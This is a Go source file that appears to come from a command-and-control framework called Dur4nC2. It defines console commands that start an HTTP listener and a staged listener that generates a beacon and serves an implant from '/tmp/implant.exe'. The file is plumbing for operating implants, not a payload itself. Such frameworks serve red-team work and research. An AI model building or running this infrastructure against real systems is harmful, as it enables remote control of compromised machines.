package jobs

import (
	"Dur4nC2/server/console"
	"Dur4nC2/server/console/command/generate"
	serverJobs "Dur4nC2/server/jobs"
	"Dur4nC2/server/listener"
	"errors"
	"github.com/desertbit/grumble"
	"strconv"
)

func HTTPListenerCmd(ctx *grumble.Context, con *console.ServerConsoleClient) error {
	domain := ctx.Flags.String("domain")
	lhost := ctx.Flags.String("lhost")
	lport := uint16(ctx.Flags.Int("lport"))

	con.PrintInfof("Starting HTTP %s:%d listener ...\n", domain, lport)
	job, err := serverJobs.StartHTTPListenerJob(&listener.HTTPListenerConfig{
		Addr:     lhost + ":" + strconv.FormatInt(int64(lport), 10),
		Domain:   domain,
		LPort:    lport,
		IsStaged: false,
	}, con)
	if err != nil {
		return errors.New("server did not create the new listener")
	} else {
		con.PrintSuccessf("Successfully started job #%d\n", job.ID)
	}
	return nil
}

func StagedHTTPListenerCmd(ctx *grumble.Context, con *console.ServerConsoleClient) error {
	domain := ctx.Flags.String("domain")
	lhost := ctx.Flags.String("lhost")
	lport := uint16(ctx.Flags.Int("lport"))

	generate.GenerateBeacon(ctx, con)

	con.PrintInfof("Starting Staged HTTP %s:%d listener ...\n", domain, lport)
	job, err := serverJobs.StartHTTPListenerJob(&listener.HTTPListenerConfig{
		Addr:      lhost + ":" + strconv.FormatInt(int64(lport), 10),
		Domain:    domain,
		LPort:     lport,
		IsStaged:  true,
		StagePath: "/tmp/implant.exe",
	}, con)
	if err != nil {
		return errors.New("server did not create the new listener")
	} else {
		con.PrintInfof("Successfully started job #%d\n", job.ID)
	}
	return nil
}
